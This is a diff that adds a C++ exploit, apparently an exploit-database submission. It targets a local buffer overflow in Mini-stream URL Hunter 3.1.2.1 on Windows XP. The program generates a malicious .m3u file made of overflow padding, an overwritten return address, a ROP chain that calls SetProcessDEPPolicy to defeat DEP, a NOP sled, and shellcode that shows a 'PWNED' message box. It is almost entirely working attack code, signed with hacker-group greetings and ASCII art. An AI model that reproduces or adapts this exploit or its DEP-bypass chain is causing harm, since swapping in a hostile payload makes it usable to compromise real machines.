@@ -1,0 +1,75 @@
+/*######################################################################
+ Exploit Title: URL Hunter buffer overflow DEP Bypass
+ Author: Ayrbyte
+ Vendor or Software Link: Mini-stream Software
+ Link : http://mini-stream.net/url-hunter/
+ Version: 3.1.2.1
+ Category: local
+ Tested on: Windows XP sp 2
+ Code : c++
+ Fb : /Ayrbyte
+########################################################################
+Greetz To : 
+    XerkusR, Kira, 3|_^^1x, WPFr, C-byte, H4mz_JR, Ch0lise7en, R31tuz
+    Zax Oktav, Andy Oioi, Rizaldy Ahmad, Rezza Aulia Pratama, Cloud Sky,
+    Zet Dot Exe, Gabby X-Friends, Valcon Trignome 
+    and all CREMY & b-compi family
+######################################################################*/
+//NOTE: Path Ayrbyte.m3u must be on the c://Ayrbyte.m3u
+#include <cstdio>
+#include <iostream>
+using namespace std;
+int main(){
+char header[] = "http://";
+char buff[] = "\x41";
+char eip[] = "\x16\x10\x9c\x7c";//#retn |SHELL32.dll
+char nop[] = "\x90";
+//call MessageBoxA "PWNED by Ayrbyte...! ^_^"
+char code[] =
+"\xB8\x36\xC6\x0D\x10" //#MOV EAX,100DC636
+"\xB9\xFF\xFF\xFF\x0F" //#MOV ECX,0FFFFFFF
+"\xBA\xFF\xFF\xFF\x0F" //#MOV EDX,0FFFFFFF
+"\x2B\xC1\x2B\xD1\x52" //#SUB EAX,ECX #SUB EDX,ECX #PUSH EDX
+"\x50\x90\x90\x90\x90" //#PUSH EAX #NOP #NOP #NOP #NOP
+"\x90\x50\x90\x90\x90" //#NOP #PUSH EAX #NOP #NOP #NOP
+"\x90\x52\x90"         //#NOP #PUSH EDX #NOP
+"\xE8\xD5\x3E\xCA\x77" //<---CALL USER32.MessageBoxA
+//string "PWNED By Ayrbyte...! ^_^"
+"\x20\x50\x57\x4E\x45\x44\x20\x42\x79\x20\x41\x79"
+"\x72\x62\x79\x74\x65\x2E\x2E\x2E\x21\x20\x5E\x5F\x5E";
+//SetProcessDEPPolicy
+char rop[] = 
+"\x41\x41\x41\x41" //agar mengarah ke esp
+"\x42\x02\x9F\x7C" //#pop ebx #retn |shell32.dll
+"\xFF\xFF\xFF\xFF" //<--akan di taruh di ebx
+"\xD8\x85\xA4\x7C" //#inc ebx #retn |shell32.dll
+"\xAF\xCF\xA4\x7C" //#pop ebp #retn |shell32.dll
+"\xA4\x22\x86\x7C" //#<- SetProcessDEPPolicy, ke EBP
+"\xCA\x2E\xAE\x7c" //#pop edi #retn |shell32.dll
+"\xCB\x2E\xAE\x7C" //#retn |shell32.dll
+"\xFE\x2E\xAE\x7C" //#pop esi #retn |shell32.dll
+"\xCB\x2E\xAE\x7C" //#retn |shell32.dll
+"\x01\x4E\x9E\x7C" //#xor eax,eax #retn |shell32.dll
+"\x1D\xC9\x91\x7C" //#xor ecx,ecx #retn |ntdll.dll
+"\x8E\x09\xF3\x77" //#xor edx,edx #retn |gdi32.dll
+"\x65\x82\xA5\x7C";//#jmp esp |shell32.dll 
+//Make Exploit File
+FILE *teksfile;
+teksfile = fopen("c:\\Ayrbyte.m3u", "w");
+fputs(header, teksfile);
+for(int i=0; i < 17417; i++){fputs(buff, teksfile);}
+fputs(eip, teksfile);
+fputs(rop, teksfile);
+for(int i=0; i < 28; i++){fputs(nop, teksfile);}
+fputs(code, teksfile);
+fclose(teksfile);
+return 0;}
+/*###############################################################
+#we are CREMY          ##########       ###### ###### ##   ##
+#we are unity          ##        ###### ##  ## ##  ##  ##  ##
+#we love peace         ## ###### ##     ##  ## ##  ##   ## ##
+#we crazy but not lazy ## ##  ## ########### ####  ##    ####
+#what about you...?    ## ###### ##     ##         ##     ###
+#be crazy now...!      ## ## ##  ###### ##         ##      ##
+##################################     ##         ##      ##
+                          ##  ##    #######################   */
